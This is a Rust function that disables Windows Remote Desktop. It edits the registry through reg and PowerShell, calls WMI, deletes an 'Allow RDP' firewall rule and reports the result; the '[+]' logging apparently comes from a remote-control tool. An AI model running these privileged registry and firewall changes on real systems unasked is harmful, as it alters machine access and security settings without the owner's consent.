// RDP deactivation function (Windows only)
#[cfg(windows)]
fn disable_rdp() -> String {
    use std::process::Command;

    println!("[+] Attempting to disable RDP...");

    let mut result_output = String::new();

    // Step 1: Disable RDP in registry (fDenyTSConnections = 1)
    let reg_args = vec![
        "add",
        "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
        "/v",
        "fDenyTSConnections",
        "/t",
        "REG_DWORD",
        "/d",
        "1",
        "/f",
    ];

    match Command::new("reg").args(&reg_args).output() {
        Ok(output) => {
            result_output.push_str(&format!(
                "1. Registry (fDenyTSConnections): {}\n",
                String::from_utf8_lossy(&output.stdout).trim()
            ));
        }
        Err(e) => {
            result_output.push_str(&format!("1. Registry command failed: {}\n", e));
        }
    }

    // Step 1b: Also set via PowerShell
    let ps_cmd = r#"Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 1 -Force"#;
    match Command::new("powershell")
        .args(&["-Command", ps_cmd])
        .output()
    {
        Ok(_) => {
            result_output.push_str("   → PowerShell confirmation: OK\n");
        }
        Err(_) => {}
    }

    // Step 2: Disable RDP via WMI
    let wmi_cmd = r#"(Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace root\CIMV2\TerminalServices).SetAllowTSConnections(0,0)"#;
    match Command::new("powershell")
        .args(&["-Command", wmi_cmd])
        .output()
    {
        Ok(output) => {
            let out = String::from_utf8_lossy(&output.stdout);
            if out.contains("ReturnValue") && out.contains("0") {
                result_output.push_str("2. WMI configuration: SUCCESS ✓\n");
            } else if !out.trim().is_empty() {
                result_output.push_str(&format!("2. WMI result: {}\n", out.trim()));
            }
        }
        Err(_) => {}
    }

    // Step 3: Optionally remove firewall rule
    match Command::new("netsh")
        .args(&[
            "advfirewall",
            "firewall",
            "delete",
            "rule",
            "name=Allow RDP",
        ])
        .output()
    {
        Ok(output) => {
            let out = String::from_utf8_lossy(&output.stdout);
            if out.contains("Ok") || out.contains("deleted") {
                result_output.push_str("3. Firewall rule removed ✓\n");
            } else {
                result_output.push_str(&format!("3. Firewall: {}\n", out.trim()));
            }
        }
        Err(_) => {}
    }

    // Step 4: Verify final configuration
    result_output.push_str("\n--- Final Configuration Check ---\n");
    match Command::new("reg")
        .args(&[
            "query",
            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
            "/v",
            "fDenyTSConnections",
        ])
        .output()
    {
        Ok(output) => {
            let out = String::from_utf8_lossy(&output.stdout);
            if out.contains("0x1") {
                result_output.push_str("✓ RDP is DISABLED in registry\n");
            } else if out.contains("0x0") {
                result_output.push_str("✗ RDP is still ENABLED in registry\n");
            }
        }
        Err(_) => {}
    }

    result_output.push_str("\n✓ RDP has been disabled.");
    result_output
}

